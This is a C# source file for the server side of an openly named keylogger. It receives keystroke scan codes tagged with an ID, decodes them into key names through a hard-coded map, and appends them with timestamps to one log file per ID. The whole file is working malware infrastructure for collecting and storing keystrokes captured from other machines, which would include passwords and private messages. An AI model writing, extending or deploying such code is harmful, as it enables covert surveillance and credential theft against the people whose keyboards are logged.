using Microsoft.AspNetCore.Http.HttpResults;
using Microsoft.AspNetCore.Mvc;

namespace keyloggerServer.Services;

public interface IKeyloggerService
{
    string LogFilePath { get; set; }
    IResult SaveToLogFile(LoadedData loadedData);
}

public class KeyloggerService : IKeyloggerService
{
    public KeyloggerService(string logFilePath, string logFileType)
    {
        LogFilePath = logFilePath;
        LogFileType = logFileType;
    }
    
    public string LogFilePath { get; set; }
    public string LogFileType { get; set; }

    public IResult SaveToLogFile(LoadedData loadedData)
    {
        try
        {
            Console.WriteLine(loadedData.Key);
            loadedData.Key = OpcodeToAscii(loadedData.Key);
            string currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
         
            Console.WriteLine("Adding:" + loadedData.ToString());
            if(loadedData.Key.Length > 0)
                File.AppendAllText(LogFilePath + loadedData.ID.ToString() + "." + LogFileType, currentTime + " " + loadedData.ToString() + Environment.NewLine);
        }
        catch (Exception e)
        {
            
            Console.WriteLine(e);
            
            return Results.Problem("Error saving data to log file: "    + e.Message, statusCode: 500);
        }
        
        return Results.Ok();
    }


    public string OpcodeToAscii(string opcode)
    {
        string ascii = "";

        var keyMap = new Dictionary<int, string>
        {
            
            {1,"esc"},
            { 2, "1" }, { 3, "2" }, { 4, "3" }, { 5, "4" }, { 6, "5" },{7,"6"},{8,"7"},{9,"8"},{10,"9"},{11,"0"},{ 12, "-" }, { 13, "=" }, { 14, "Backspace" }, 
            { 15, "Tab" }, { 16, "Q" }, { 17, "W" }, { 18, "E" }, { 19, "R" }, { 20, "T" }, { 21, "Y" },{22,"U"},{23,"I"},{24,"O"},{25,"P"},{26,"["},{27,"]"},{43,"\\"},
            { 58, "CapsLock" }, { 30, "A" }, { 31, "S" }, { 32, "D" }, { 33, "F" }, { 34, "G" }, { 35, "H" }, { 36, "J" }, { 37, "K" }, { 38, "L" },{39,";"},{40,"'"},{28,"Enter"},
            { 42, "Lshift" }, { 44, "Z" }, { 45, "X" }, { 46, "C" }, { 47, "V" },{48,"B"},{49,"N"},{50,"M"},{51,","},{52,"."},{53,"/"},{54,"Rshift"},
            { 29,"ctrl"}, {56,"alt"},{57," "}, {72,"upArrow"},{75,"leftArrow"}, {80,"downArrow"},{77,"rightArrow"},
            {99,"LShiftEnd"}
        };

        
        for (int i = 0; i < opcode.Length; i += 2)
        {
            int code = Convert.ToInt32(opcode.Substring(i, 2));

            if (keyMap.ContainsKey(code))
            {
                ascii += keyMap[code];
            }
        }

        return ascii;
    }
 
    
    
    
}